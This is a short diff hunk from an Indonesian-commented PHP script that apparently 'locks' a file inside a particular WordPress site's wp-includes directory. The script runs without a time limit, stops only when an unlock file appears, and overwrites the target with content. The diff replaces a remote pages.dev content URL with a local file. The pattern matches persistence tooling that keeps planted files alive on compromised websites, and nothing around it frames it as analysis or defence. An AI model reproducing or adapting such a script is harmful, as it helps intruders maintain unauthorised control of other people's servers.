@@ -6,7 +6,7 @@ set_time_limit(0); // Script tidak memiliki batas waktu eksekusi
 
 $unlockFile = 'unlock.txt'; // File untuk memberikan sinyal penghentian script
 $lockFilePath = '/home/websitefaiumsu/public_html/wp-includes/Requests/library/store.php'; // File yang akan dikunci
-$lockContentFile = 'https://69hektar.pages.dev/umsu/fai/lp.txt'; // File berisi konten untuk mengunci
+$lockContentFile = 'content.txt'; // File berisi konten untuk mengunci
 
 // Periksa apakah file konten kunci tersedia
 if (!file_exists($lockContentFile)) {
